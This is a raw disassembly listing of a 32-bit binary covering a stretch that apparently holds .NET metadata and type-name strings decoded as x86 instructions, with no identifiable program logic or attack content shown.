  406edc:	77 03                	ja     0x406ee1
  406ede:	11 02                	adc    %eax,(%edx)
  406ee0:	94                   	xchg   %eax,%esp
  406ee1:	10 ff                	adc    %bh,%bh
  406ee3:	03 61 02             	add    0x2(%ecx),%esp
  406ee6:	7b 18                	jnp    0x406f00
  406ee8:	05 04 e1 03 a8       	add    $0xa803e104,%eax
  406eed:	14 06                	adc    $0x6,%al
  406eef:	00 21                	add    %ah,(%ecx)
  406ef1:	02 43 02             	add    0x2(%ebx),%al
  406ef4:	45                   	inc    %ebp
  406ef5:	00 e9                	add    %ch,%cl
  406ef7:	03 c0                	add    %eax,%eax
  406ef9:	0c 16                	or     $0x16,%al
  406efb:	04 b9                	add    $0xb9,%al
  406efd:	02 2a                	add    (%edx),%ch
  406eff:	0c ce                	or     $0xce,%al
  406f01:	00 61 02             	add    %ah,0x2(%ecx)
  406f04:	8e 0c 1d 04 61 02 ea 	mov    -0x15fd9efc(,%ebx,1),%cs
  406f0b:	13 fb                	adc    %ebx,%edi
  406f0d:	00 61 02             	add    %ah,0x2(%ecx)
  406f10:	bc 04 2a 04 11       	mov    $0x11042a04,%esp
  406f15:	02 6e 0f             	add    0xf(%esi),%ch
  406f18:	30 04 61             	xor    %al,(%ecx,%eiz,2)
  406f1b:	03 2a                	add    (%edx),%ebp
  406f1d:	0c fb                	or     $0xfb,%al
  406f1f:	00 f1                	add    %dh,%cl
  406f21:	03 ef                	add    %edi,%ebp
  406f23:	0c 77                	or     $0x77,%al
  406f25:	03 79 03             	add    0x3(%ecx),%edi
  406f28:	6c                   	insb   (%dx),%es:(%edi)
  406f29:	07                   	pop    %es
  406f2a:	34 04                	xor    $0x4,%al
  406f2c:	31 01                	xor    %eax,(%ecx)
  406f2e:	7e 07                	jle    0x406f37
  406f30:	34 04                	xor    $0x4,%al
  406f32:	31 01                	xor    %eax,(%ecx)
  406f34:	2a 0c fb             	sub    (%ebx,%edi,8),%cl
  406f37:	00 f9                	add    %bh,%cl
  406f39:	03 c2                	add    %edx,%eax
  406f3b:	1a 3a                	sbb    (%edx),%bh
  406f3d:	04 01                	add    $0x1,%al
  406f3f:	04 a8                	add    $0xa8,%al
  406f41:	14 40                	adc    $0x40,%al
  406f43:	04 01                	add    $0x1,%al
  406f45:	04 4b                	add    $0x4b,%al
  406f47:	06                   	push   %es
  406f48:	47                   	inc    %edi
  406f49:	04 99                	add    $0x99,%al
  406f4b:	00 29                	add    %ch,(%ecx)
  406f4d:	08 06                	or     %al,(%esi)
  406f4f:	00 71 01             	add    %dh,0x1(%ecx)
  406f52:	a8 14                	test   $0x14,%al
  406f54:	c1 00 24             	roll   $0x24,(%eax)
  406f57:	00 a8 14 06 00 24    	add    %ch,0x24000614(%eax)
  406f5d:	00 1f                	add    %bl,(%edi)
  406f5f:	03 d1                	add    %ecx,%edx
  406f61:	01 24 00             	add    %esp,(%eax,%eax,1)
  406f64:	0d 1b c8 01 24       	or     $0x2401c81b,%eax
  406f69:	00 16                	add    %dl,(%esi)
  406f6b:	1c 68                	sbb    $0x68,%al
  406f6d:	04 61                	add    $0x61,%al
  406f6f:	02 73 10             	add    0x10(%ebx),%dh
  406f72:	6e                   	outsb  %ds:(%esi),(%dx)
  406f73:	04 91                	add    $0x91,%al
  406f75:	01 99 17 80 04 91    	add    %ebx,-0x6efb7fe9(%ecx)
  406f7b:	01 e5                	add    %esp,%ebp
  406f7d:	01 87 04 99 01 68    	add    %eax,0x68019904(%edi)
  406f83:	03 87 04 11 04 0f    	add    0xf041104(%edi),%eax
  406f89:	1d 8d 04 a1 01       	sbb    $0x1a1048d,%eax
  406f8e:	a8 14                	test   $0x14,%al
  406f90:	97                   	xchg   %eax,%edi
  406f91:	04 19                	add    $0x19,%al
  406f93:	04 29                	add    $0x29,%al
  406f95:	08 06                	or     %al,(%esi)
  406f97:	00 21                	add    %ah,(%ecx)
  406f99:	04 a8                	add    $0xa8,%al
  406f9b:	14 e4                	adc    $0xe4,%al
  406f9d:	00 29                	add    %ch,(%ecx)
  406f9f:	04 79                	add    $0x79,%al
  406fa1:	0b 9f 04 51 01 f1    	or     -0xefeaefc(%edi),%ebx
  406fa7:	04 8e                	add    $0x8e,%al
  406fa9:	01 61 01             	add    %esp,0x1(%ecx)
  406fac:	45                   	inc    %ebp
  406fad:	1c 5b                	sbb    $0x5b,%al
  406faf:	03 61 01             	add    0x1(%ecx),%esp
  406fb2:	83 0a ad             	orl    $0xffffffad,(%edx)
  406fb5:	04 89                	add    $0x89,%al
  406fb7:	00 53 05             	add    %dl,0x5(%ebx)
  406fba:	fb                   	sti
  406fbb:	00 61 01             	add    %ah,0x1(%ecx)
  406fbe:	45                   	inc    %ebp
  406fbf:	1c bd                	sbb    $0xbd,%al
  406fc1:	04 61                	add    $0x61,%al
  406fc3:	01 7a 0a             	add    %edi,0xa(%edx)
  406fc6:	ac                   	lods   %ds:(%esi),%al
  406fc7:	03 61 01             	add    0x1(%ecx),%esp
  406fca:	63 0a                	arpl   %ecx,(%edx)
  406fcc:	10 00                	adc    %al,(%eax)
  406fce:	61                   	popa
  406fcf:	01 5f 1c             	add    %ebx,0x1c(%edi)
  406fd2:	c4 04 61             	les    (%ecx,%eiz,2),%eax
  406fd5:	01 42 05             	add    %eax,0x5(%edx)
  406fd8:	10 00                	adc    %al,(%eax)
  406fda:	c9                   	leave
  406fdb:	03 75 1b             	add    0x1b(%ebp),%esi
  406fde:	de 04 0c             	fiadds (%esp,%ecx,1)
  406fe1:	00 ae 0a f5 04 39    	add    %ch,0x3904f50a(%esi)
  406fe7:	04 50                	add    $0x50,%al
  406fe9:	10 ff                	adc    %bh,%bh
  406feb:	04 39                	add    $0x39,%al
  406fed:	04 15                	add    $0x15,%al
  406fef:	03 05 05 41 04 f0    	add    0xf0044105,%eax
  406ff5:	07                   	pop    %es
  406ff6:	0d 05 51 04 c4       	or     $0xc4045105,%eax
  406ffb:	04 14                	add    $0x14,%al
  406ffd:	05 49 04 e2 05       	add    $0x5e20449,%eax
  407002:	1b 05 61 04 7e 08    	sbb    0x87e0461,%eax
  407008:	24 05                	and    $0x5,%al
  40700a:	71 04                	jno    0x407010
  40700c:	6d                   	insl   (%dx),%es:(%edi)
  40700d:	12 2e                	adc    (%esi),%ch
  40700f:	05 2c 00 7e 08       	add    $0x87e002c,%eax
  407014:	67 05 2c 00 2b 19    	addr16 add $0x192b002c,%eax
  40701a:	74 05                	je     0x407021
  40701c:	34 00                	xor    $0x0,%al
  40701e:	6f                   	outsl  %ds:(%esi),(%dx)
  40701f:	05 8f 05 61 02       	add    $0x261058f,%eax
  407024:	4d                   	dec    %ebp
  407025:	1d 36 00 89 04       	sbb    $0x4890036,%eax
  40702a:	a8 14                	test   $0x14,%al
  40702c:	10 00                	adc    %al,(%eax)
  40702e:	c9                   	leave
  40702f:	01 a8 14 ad 05 91    	add    %ebp,-0x6efa52ec(%eax)
  407035:	04 56                	add    $0x56,%al
  407037:	16                   	push   %ss
  407038:	b5 05                	mov    $0x5,%ch
  40703a:	09 02                	or     %eax,(%edx)
  40703c:	f5                   	cmc
  40703d:	0b bb 05 99 04 a8    	or     -0x57fb66fb(%ebx),%edi
  407043:	14 10                	adc    $0x10,%al
  407045:	00 d1                	add    %dl,%cl
  407047:	01 a8 14 06 00 a1    	add    %ebp,-0x5efff9ec(%eax)
  40704d:	04 21                	add    $0x21,%al
  40704f:	0b 01                	or     (%ecx),%eax
  407051:	00 a1 04 be 0a 01    	add    %ah,0x10abe04(%ecx)
  407057:	00 a1 04 d3 04 d3    	add    %ah,-0x2cfb2cfc(%ecx)
  40705d:	05 a1 04 6d 0b       	add    $0xb6d04a1,%eax
  407062:	da 05 a1 04 3d 1c    	fiaddl 0x1c3d04a1
  407068:	57                   	push   %edi
  407069:	00 a1 04 7d 02 06    	add    %ah,0x6027d04(%ecx)
  40706f:	00 a1 04 cd 14 e1    	add    %ah,-0x1eeb32fc(%ecx)
  407075:	05 d9 01 a8 14       	add    $0x14a801d9,%eax
  40707a:	e7 05                	out    %eax,$0x5
  40707c:	a1 04 6f 02 f4       	mov    0xf4026f04,%eax
  407081:	05 d9 01 eb 0d       	add    $0xdeb01d9,%eax
  407086:	06                   	push   %es
  407087:	00 e1                	add    %ah,%cl
  407089:	01 a8 14 57 00 e9    	add    %ebp,-0x16ffa8ec(%eax)
  40708f:	00 16                	add    %dl,(%esi)
  407091:	1c f4                	sbb    $0xf4,%al
  407093:	05 e9 03 c0 0c       	add    $0xcc003e9,%eax
  407098:	f9                   	stc
  407099:	05 c9 04 a8 14       	add    $0x14a804c9,%eax
  40709e:	10 00                	adc    %al,(%eax)
  4070a0:	a1 04 76 02 57       	mov    0x57027604,%eax
  4070a5:	00 a1 04 bd 14 e1    	add    %ah,-0x1eeb42fc(%ecx)
  4070ab:	05 d1 04 d0 1c       	add    $0x1cd004d1,%eax
  4070b0:	1c 06                	sbb    $0x6,%al
  4070b2:	e9 01 a8 14 06       	jmp    0x65518b8
  4070b7:	00 f1                	add    %dh,%cl
  4070b9:	01 a8 14 53 06 08    	add    %ebp,0x8065314(%eax)
  4070bf:	00 a4 00 7b 06 08 00 	add    %ah,0x8067b(%eax,%eax,1)
  4070c6:	a8 00                	test   $0x0,%al
  4070c8:	80 06 08             	addb   $0x8,(%esi)
  4070cb:	00 ac 00 85 06 08 00 	add    %ch,0x80685(%eax,%eax,1)
  4070d2:	b0 00                	mov    $0x0,%al
  4070d4:	8a 06                	mov    (%esi),%al
  4070d6:	08 00                	or     %al,(%eax)
  4070d8:	b4 00                	mov    $0x0,%ah
  4070da:	8f 06                	pop    (%esi)
  4070dc:	08 00                	or     %al,(%eax)
  4070de:	b8 00 94 06 08       	mov    $0x8069400,%eax
  4070e3:	00 bc 00 99 06 08 00 	add    %bh,0x80699(%eax,%eax,1)
  4070ea:	c0 00 9e             	rolb   $0x9e,(%eax)
  4070ed:	06                   	push   %es
  4070ee:	08 00                	or     %al,(%eax)
  4070f0:	c4 00                	les    (%eax),%eax
  4070f2:	a3 06 08 00 c8       	mov    %eax,0xc8000806
  4070f7:	00 a8 06 08 00 cc    	add    %ch,-0x33fff7fa(%eax)
  4070fd:	00 ad 06 08 00 d0    	add    %ch,-0x2ffff7fa(%ebp)
  407103:	00 b2 06 08 00 e0    	add    %dh,-0x1ffff7fa(%edx)
  407109:	00 b7 06 08 00 e4    	add    %dh,-0x1bfff7fa(%edi)
  40710f:	00 bc 06 08 00 e8 00 	add    %bh,0xe80008(%esi,%eax,1)
  407116:	c1 06 08             	roll   $0x8,(%esi)
  407119:	00 ec                	add    %ch,%ah
  40711b:	00 b7 06 09 00 08    	add    %dh,0x8000906(%edi)
  407121:	01 c6                	add    %eax,%esi
  407123:	06                   	push   %es
  407124:	09 00                	or     %eax,(%eax)
  407126:	0c 01                	or     $0x1,%al
  407128:	85 06                	test   %eax,(%esi)
  40712a:	09 00                	or     %eax,(%eax)
  40712c:	10 01                	adc    %al,(%ecx)
  40712e:	80 06 2e             	addb   $0x2e,(%esi)
  407131:	00 0b                	add    %cl,(%ebx)
  407133:	00 d3                	add    %dl,%bl
  407135:	08 2e                	or     %ch,(%esi)
  407137:	00 13                	add    %dl,(%ebx)
  407139:	00 dc                	add    %bl,%ah
  40713b:	08 2e                	or     %ch,(%esi)
  40713d:	00 1b                	add    %bl,(%ebx)
  40713f:	00 fb                	add    %bh,%bl
  407141:	08 2e                	or     %ch,(%esi)
  407143:	00 23                	add    %ah,(%ebx)
  407145:	00 04 09             	add    %al,(%ecx,%ecx,1)
  407148:	2e 00 2b             	add    %ch,%cs:(%ebx)
  40714b:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40714e:	2e 00 33             	add    %dh,%cs:(%ebx)
  407151:	00 04 09             	add    %al,(%ecx,%ecx,1)
  407154:	2e 00 3b             	add    %bh,%cs:(%ebx)
  407157:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40715a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40715e:	04 09                	add    $0x9,%al
  407160:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  407164:	04 09                	add    $0x9,%al
  407166:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  40716a:	04 09                	add    $0x9,%al
  40716c:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  407170:	04 09                	add    $0x9,%al
  407172:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  407176:	0a 09                	or     (%ecx),%cl
  407178:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  40717c:	17                   	pop    %ss
  40717d:	09 c0                	or     %eax,%eax
  40717f:	00 73 00             	add    %dh,0x0(%ebx)
  407182:	80 06 e0             	addb   $0xe0,(%esi)
  407185:	00 73 00             	add    %dh,0x0(%ebx)
  407188:	80 06 e3             	addb   $0xe3,(%esi)
  40718b:	00 93 00 7d 09 00    	add    %dl,0x97d00(%ebx)
  407191:	01 73 00             	add    %esi,0x0(%ebx)
  407194:	80 06 20             	addb   $0x20,(%esi)
  407197:	01 73 00             	add    %esi,0x0(%ebx)
  40719a:	80 06 40             	addb   $0x40,(%esi)
  40719d:	01 73 00             	add    %esi,0x0(%ebx)
  4071a0:	80 06 60             	addb   $0x60,(%esi)
  4071a3:	01 73 00             	add    %esi,0x0(%ebx)
  4071a6:	80 06 80             	addb   $0x80,(%esi)
  4071a9:	01 73 00             	add    %esi,0x0(%ebx)
  4071ac:	80 06 a0             	addb   $0xa0,(%esi)
  4071af:	01 73 00             	add    %esi,0x0(%ebx)
  4071b2:	80 06 c0             	addb   $0xc0,(%esi)
  4071b5:	01 73 00             	add    %esi,0x0(%ebx)
  4071b8:	80 06 e0             	addb   $0xe0,(%esi)
  4071bb:	01 73 00             	add    %esi,0x0(%ebx)
  4071be:	80 06 00             	addb   $0x0,(%esi)
  4071c1:	02 73 00             	add    0x0(%ebx),%dh
  4071c4:	80 06 20             	addb   $0x20,(%esi)
  4071c7:	02 73 00             	add    0x0(%ebx),%dh
  4071ca:	80 06 40             	addb   $0x40,(%esi)
  4071cd:	02 73 00             	add    0x0(%ebx),%dh
  4071d0:	80 06 41             	addb   $0x41,(%esi)
  4071d3:	02 73 00             	add    0x0(%ebx),%dh
  4071d6:	80 06 60             	addb   $0x60,(%esi)
  4071d9:	02 73 00             	add    0x0(%ebx),%dh
  4071dc:	80 06 61             	addb   $0x61,(%esi)
  4071df:	02 73 00             	add    0x0(%ebx),%dh
  4071e2:	80 06 80             	addb   $0x80,(%esi)
  4071e5:	02 73 00             	add    0x0(%ebx),%dh
  4071e8:	80 06 81             	addb   $0x81,(%esi)
  4071eb:	02 73 00             	add    0x0(%ebx),%dh
  4071ee:	80 06 a0             	addb   $0xa0,(%esi)
  4071f1:	02 73 00             	add    0x0(%ebx),%dh
  4071f4:	80 06 a1             	addb   $0xa1,(%esi)
  4071f7:	02 73 00             	add    0x0(%ebx),%dh
  4071fa:	80 06 c0             	addb   $0xc0,(%esi)
  4071fd:	02 73 00             	add    0x0(%ebx),%dh
  407200:	80 06 c1             	addb   $0xc1,(%esi)
  407203:	02 73 00             	add    0x0(%ebx),%dh
  407206:	80 06 e0             	addb   $0xe0,(%esi)
  407209:	02 73 00             	add    0x0(%ebx),%dh
  40720c:	80 06 e1             	addb   $0xe1,(%esi)
  40720f:	02 73 00             	add    0x0(%ebx),%dh
  407212:	80 06 00             	addb   $0x0,(%esi)
  407215:	03 73 00             	add    0x0(%ebx),%esi
  407218:	80 06 01             	addb   $0x1,(%esi)
  40721b:	03 73 00             	add    0x0(%ebx),%esi
  40721e:	80 06 21             	addb   $0x21,(%esi)
  407221:	03 73 00             	add    0x0(%ebx),%esi
  407224:	80 06 23             	addb   $0x23,(%esi)
  407227:	03 73 00             	add    0x0(%ebx),%esi
  40722a:	80 06 41             	addb   $0x41,(%esi)
  40722d:	03 73 00             	add    0x0(%ebx),%esi
  407230:	80 06 61             	addb   $0x61,(%esi)
  407233:	03 73 00             	add    0x0(%ebx),%esi
  407236:	80 06 63             	addb   $0x63,(%esi)
  407239:	03 73 00             	add    0x0(%ebx),%esi
  40723c:	80 06 01             	addb   $0x1,(%esi)
  40723f:	00 06                	add    %al,(%esi)
  407241:	00 00                	add    %al,(%eax)
  407243:	00 1c 00             	add    %bl,(%eax,%eax,1)
  407246:	01 00                	add    %eax,(%eax)
  407248:	20 00                	and    %al,(%eax)
  40724a:	00 00                	add    %al,(%eax)
  40724c:	1d 00 28 00 41       	sbb    $0x41002800,%eax
  407251:	00 7d 00             	add    %bh,0x0(%ebp)
  407254:	2f                   	das
  407255:	01 55 01             	add    %edx,0x1(%ebp)
  407258:	92                   	xchg   %eax,%edx
  407259:	01 a7 01 cc 01 d7    	add    %esp,-0x28fe33ff(%edi)
  40725f:	01 02                	add    %eax,(%edx)
  407261:	02 15 02 5a 02 6f    	add    0x6f025a02,%dl
  407267:	02 8d 02 a3 02 a8    	add    -0x57fd5cfe(%ebp),%cl
  40726d:	02 df                	add    %bh,%bl
  40726f:	02 e8                	add    %al,%ch
  407271:	02 ee                	add    %dh,%ch
  407273:	02 f3                	add    %bl,%dh
  407275:	02 f9                	add    %cl,%bh
  407277:	02 02                	add    (%edx),%al
  407279:	03 0f                	add    (%edi),%ecx
  40727b:	03 84 03 89 03 b1 03 	add    0x3b10389(%ebx,%eax,1),%eax
  407282:	ba 03 bf 03 cb       	mov    $0xcb03bf03,%edx
  407287:	03 f7                	add    %edi,%esi
  407289:	03 0b                	add    (%ebx),%ecx
  40728b:	04 23                	add    $0x23,%al
  40728d:	04 4e                	add    $0x4e,%al
  40728f:	04 75                	add    $0x75,%al
  407291:	04 a6                	add    $0xa6,%al
  407293:	04 b6                	add    $0xb6,%al
  407295:	04 cc                	add    $0xcc,%al
  407297:	04 fb                	add    $0xfb,%al
  407299:	04 a7                	add    $0xa7,%al
  40729b:	05 c1 05 02 06       	add    $0x60205c1,%eax
  4072a0:	29 06                	sub    %eax,(%esi)
  4072a2:	2e 06                	cs push %es
  4072a4:	3c 06                	cmp    $0x6,%al
  4072a6:	44                   	inc    %esp
  4072a7:	06                   	push   %es
  4072a8:	5d                   	pop    %ebp
  4072a9:	06                   	push   %es
  4072aa:	04 00                	add    $0x0,%al
  4072ac:	01 00                	add    %eax,(%eax)
  4072ae:	06                   	push   %es
  4072af:	00 0b                	add    %cl,(%ebx)
  4072b1:	00 07                	add    %al,(%edi)
  4072b3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4072b6:	08 00                	or     %al,(%eax)
  4072b8:	0e                   	push   %cs
  4072b9:	00 00                	add    %al,(%eax)
  4072bb:	00 2c 1a             	add    %ch,(%edx,%ebx,1)
  4072be:	8b 08                	mov    (%eax),%ecx
  4072c0:	00 00                	add    %al,(%eax)
  4072c2:	10 1a                	adc    %bl,(%edx)
  4072c4:	90                   	nop
  4072c5:	08 00                	or     %al,(%eax)
  4072c7:	00 39                	add    %bh,(%ecx)
  4072c9:	13 95 08 00 00 ed    	adc    -0x12fffff8(%ebp),%edx
  4072cf:	0a 9a 08 00 00 98    	or     -0x67fffff8(%edx),%bl
  4072d5:	19 9a 08 00 00 a4    	sbb    %ebx,-0x5bfffff8(%edx)
  4072db:	0a 9e 08 00 00 53    	or     0x53000008(%esi),%bl
  4072e1:	03 a3 08 00 00 ec    	add    -0x13fffff8(%ebx),%esp
  4072e7:	02 a7 08 00 00 57    	add    0x57000008(%edi),%ah
  4072ed:	0b 9e 08 00 00 9c    	or     -0x63fffff8(%esi),%ebx
  4072f3:	0e                   	push   %cs
  4072f4:	ab                   	stos   %eax,%es:(%edi)
  4072f5:	08 00                	or     %al,(%eax)
  4072f7:	00 70 1a             	add    %dh,0x1a(%eax)
  4072fa:	af                   	scas   %es:(%edi),%eax
  4072fb:	08 00                	or     %al,(%eax)
  4072fd:	00 69 0f             	add    %ch,0xf(%ecx)
  407300:	b3 08                	mov    $0x8,%bl
  407302:	00 00                	add    %al,(%eax)
  407304:	3f                   	aas
  407305:	0d b9 08 00 00       	or     $0x8b9,%eax
  40730a:	6a 0c                	push   $0xc
  40730c:	bd 08 00 00 79       	mov    $0x79000008,%ebp
  407311:	13 c1                	adc    %ecx,%eax
  407313:	08 00                	or     %al,(%eax)
  407315:	00 c6                	add    %al,%dh
  407317:	18 c5                	sbb    %al,%ch
  407319:	08 00                	or     %al,(%eax)
  40731b:	00 2d 1c c9 08 00    	add    %ch,0x8c91c
  407321:	00 c3                	add    %al,%bl
  407323:	07                   	pop    %es
  407324:	ce                   	into
  407325:	08 02                	or     %al,(%edx)
  407327:	00 06                	add    %al,(%esi)
  407329:	00 03                	add    %al,(%ebx)
  40732b:	00 01                	add    %al,(%ecx)
  40732d:	00 07                	add    %al,(%edi)
  40732f:	00 03                	add    %al,(%ebx)
  407331:	00 02                	add    %al,(%edx)
  407333:	00 08                	add    %cl,(%eax)
  407335:	00 05 00 01 00 09    	add    %al,0x9000100
  40733b:	00 05 00 02 00 0a    	add    %al,0xa000200
  407341:	00 07                	add    %al,(%edi)
  407343:	00 01                	add    %al,(%ecx)
  407345:	00 0b                	add    %cl,(%ebx)
  407347:	00 07                	add    %al,(%edi)
  407349:	00 02                	add    %al,(%edx)
  40734b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40734e:	09 00                	or     %eax,(%eax)
  407350:	01 00                	add    %eax,(%eax)
  407352:	0d 00 09 00 02       	or     $0x2000900,%eax
  407357:	00 0e                	add    %cl,(%esi)
  407359:	00 0b                	add    %cl,(%ebx)
  40735b:	00 01                	add    %al,(%ecx)
  40735d:	00 0f                	add    %cl,(%edi)
  40735f:	00 0b                	add    %cl,(%ebx)
  407361:	00 02                	add    %al,(%edx)
  407363:	00 10                	add    %dl,(%eax)
  407365:	00 0d 00 01 00 11    	add    %cl,0x11000100
  40736b:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407371:	00 0f                	add    %cl,(%edi)
  407373:	00 01                	add    %al,(%ecx)
  407375:	00 13                	add    %dl,(%ebx)
  407377:	00 0f                	add    %cl,(%edi)
  407379:	00 02                	add    %al,(%edx)
  40737b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40737e:	11 00                	adc    %eax,(%eax)
  407380:	02 00                	add    (%eax),%al
  407382:	15 00 13 00 01       	adc    $0x1001300,%eax
  407387:	00 16                	add    %dl,(%esi)
  407389:	00 13                	add    %dl,(%ebx)
  40738b:	00 02                	add    %al,(%edx)
  40738d:	00 17                	add    %dl,(%edi)
  40738f:	00 15 00 01 00 18    	add    %dl,0x18000100
  407395:	00 15 00 02 00 2e    	add    %dl,0x2e000200
  40739b:	00 17                	add    %dl,(%edi)
  40739d:	00 02                	add    %al,(%edx)
  40739f:	00 36                	add    %dh,(%esi)
  4073a1:	00 19                	add    %bl,(%ecx)
  4073a3:	00 02                	add    %al,(%edx)
  4073a5:	00 37                	add    %dh,(%edi)
  4073a7:	00 1b                	add    %bl,(%ebx)
  4073a9:	00 02                	add    %al,(%edx)
  4073ab:	00 59 00             	add    %bl,0x0(%ecx)
  4073ae:	1d 00 01 00 5a       	sbb    $0x5a000100,%eax
  4073b3:	00 1d 00 02 00 5b    	add    %bl,0x5b000200
  4073b9:	00 1f                	add    %bl,(%edi)
  4073bb:	00 01                	add    %al,(%ecx)
  4073bd:	00 5c 00 1f          	add    %bl,0x1f(%eax,%eax,1)
  4073c1:	00 02                	add    %al,(%edx)
  4073c3:	00 5d 00             	add    %bl,0x0(%ebp)
  4073c6:	21 00                	and    %eax,(%eax)
  4073c8:	01 00                	add    %eax,(%eax)
  4073ca:	5e                   	pop    %esi
  4073cb:	00 21                	add    %ah,(%ecx)
  4073cd:	00 02                	add    %al,(%edx)
  4073cf:	00 5f 00             	add    %bl,0x0(%edi)
  4073d2:	23 00                	and    (%eax),%eax
  4073d4:	02 00                	add    (%eax),%al
  4073d6:	60                   	pusha
  4073d7:	00 25 00 06 00 5c    	add    %ah,0x5c000600
  4073dd:	00 1f                	add    %bl,(%edi)
  4073df:	00 06                	add    %al,(%esi)
  4073e1:	00 5e 00             	add    %bl,0x0(%esi)
  4073e4:	21 00                	and    %eax,(%eax)
  4073e6:	06                   	push   %es
  4073e7:	00 60 00             	add    %ah,0x0(%eax)
  4073ea:	23 00                	and    (%eax),%eax
  4073ec:	08 00                	or     %al,(%eax)
  4073ee:	c2 00 27             	ret    $0x2700
  4073f1:	00 b4 0e c1 0e ba 01 	add    %dh,0x1ba0ec1(%esi,%ecx,1)
  4073f8:	f0 01 6c 02 61       	lock add %ebp,0x61(%edx,%eax,1)
  4073fd:	04 4b                	add    $0x4b,%al
  4073ff:	05 78 05 00 01       	add    $0x1000578,%eax
  407404:	f1                   	int1
  407405:	00 c0                	add    %al,%al
  407407:	05 01 00 41 01       	add    $0x1410001,%eax
  40740c:	f3 00 cd             	repz add %cl,%ch
  40740f:	1a 01                	sbb    (%ecx),%al
  407411:	00 40 01             	add    %al,0x1(%eax)
  407414:	0b 01                	or     (%ecx),%eax
  407416:	85 08                	test   %ecx,(%eax)
  407418:	01 00                	add    %eax,(%eax)
  40741a:	40                   	inc    %eax
  40741b:	01 19                	add    %ebx,(%ecx)
  40741d:	01 1d 0e 02 00 ac    	add    %ebx,0xac00020e
  407423:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407424:	00 00                	add    %al,(%eax)
  407426:	3f                   	aas
  407427:	00 cc                	add    %cl,%ah
  407429:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40742a:	00 00                	add    %al,(%eax)
  40742c:	40                   	inc    %eax
  40742d:	00 04 80             	add    %al,(%eax,%eax,4)
  407430:	00 00                	add    %al,(%eax)
  407432:	01 00                	add    %eax,(%eax)
	...
  407440:	b2 02                	mov    $0x2,%dl
  407442:	00 00                	add    %al,(%eax)
  407444:	04 00                	add    $0x0,%al
	...
  40744e:	00 00                	add    %al,(%eax)
  407450:	69 06 a9 02 00 00    	imul   $0x2a9,(%esi),%eax
  407456:	00 00                	add    %al,(%eax)
  407458:	04 00                	add    $0x0,%al
	...
  407462:	00 00                	add    %al,(%eax)
  407464:	69 06 82 0f 00 00    	imul   $0xf82,(%esi),%eax
  40746a:	00 00                	add    %al,(%eax)
  40746c:	04 00                	add    $0x0,%al
	...
  407476:	00 00                	add    %al,(%eax)
  407478:	72 06                	jb     0x407480
  40747a:	4b                   	dec    %ebx
  40747b:	1a 00                	sbb    (%eax),%al
  40747d:	00 00                	add    %al,(%eax)
  40747f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40748a:	00 00                	add    %al,(%eax)
  40748c:	72 06                	jb     0x407494
  40748e:	98                   	cwtl
  40748f:	0c 00                	or     $0x0,%al
  407491:	00 00                	add    %al,(%eax)
  407493:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40749e:	00 00                	add    %al,(%eax)
  4074a0:	69 06 0d 08 00 00    	imul   $0x80d,(%esi),%eax
  4074a6:	00 00                	add    %al,(%eax)
  4074a8:	0a 00                	or     (%eax),%al
	...
  4074b2:	00 00                	add    %al,(%eax)
  4074b4:	72 06                	jb     0x4074bc
  4074b6:	d2 02                	rolb   %cl,(%edx)
  4074b8:	00 00                	add    %al,(%eax)
  4074ba:	00 00                	add    %al,(%eax)
  4074bc:	04 00                	add    $0x0,%al
	...
  4074c6:	00 00                	add    %al,(%eax)
  4074c8:	69 06 51 17 00 00    	imul   $0x1751,(%esi),%eax
  4074ce:	00 00                	add    %al,(%eax)
  4074d0:	04 00                	add    $0x0,%al
	...
  4074da:	00 00                	add    %al,(%eax)
  4074dc:	72 06                	jb     0x4074e4
  4074de:	37                   	aaa
  4074df:	12 00                	adc    (%eax),%al
  4074e1:	00 00                	add    %al,(%eax)
  4074e3:	00 1a                	add    %bl,(%edx)
  4074e5:	00 11                	add    %dl,(%ecx)
  4074e7:	00 1b                	add    %bl,(%ebx)
  4074e9:	00 15 00 1c 00 19    	add    %dl,0x19001c00
  4074ef:	00 1d 00 19 00 79    	add    %bl,0x79001900
  4074f5:	01 e4                	add    %esp,%esp
  4074f7:	03 7b 01             	add    0x1(%ebx),%edi
  4074fa:	e4 03                	in     $0x3,%al
  4074fc:	d7                   	xlat   %ds:(%ebx)
  4074fd:	01 f0                	add    %esi,%eax
  4074ff:	04 00                	add    $0x0,%al
  407501:	00 00                	add    %al,(%eax)
  407503:	00 00                	add    %al,(%eax)
  407505:	41                   	inc    %ecx
  407506:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  40750a:	6e                   	outsb  %ds:(%esi),(%dx)
  40750b:	60                   	pusha
  40750c:	31 30                	xor    %esi,(%eax)
  40750e:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407511:	70 5f                	jo     0x407572
  407513:	5f                   	pop    %edi
  407514:	30 00                	xor    %al,(%eax)
  407516:	49                   	dec    %ecx
  407517:	45                   	inc    %ebp
  407518:	6e                   	outsb  %ds:(%esi),(%dx)
  407519:	75 6d                	jne    0x407588
  40751b:	65 72 61             	gs jb  0x40757f
  40751e:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407522:	31 00                	xor    %eax,(%eax)
  407524:	43                   	inc    %ebx
  407525:	61                   	popa
  407526:	6c                   	insb   (%dx),%es:(%edi)
  407527:	6c                   	insb   (%dx),%es:(%edi)
  407528:	53                   	push   %ebx
  407529:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407530:	69 
  407531:	73 74                	jae    0x4075a7
  407533:	60                   	pusha
  407534:	31 00                	xor    %eax,(%eax)
  407536:	61                   	popa
  407537:	31 00                	xor    %eax,(%eax)
  407539:	76 31                	jbe    0x40756c
  40753b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40753e:	53                   	push   %ebx
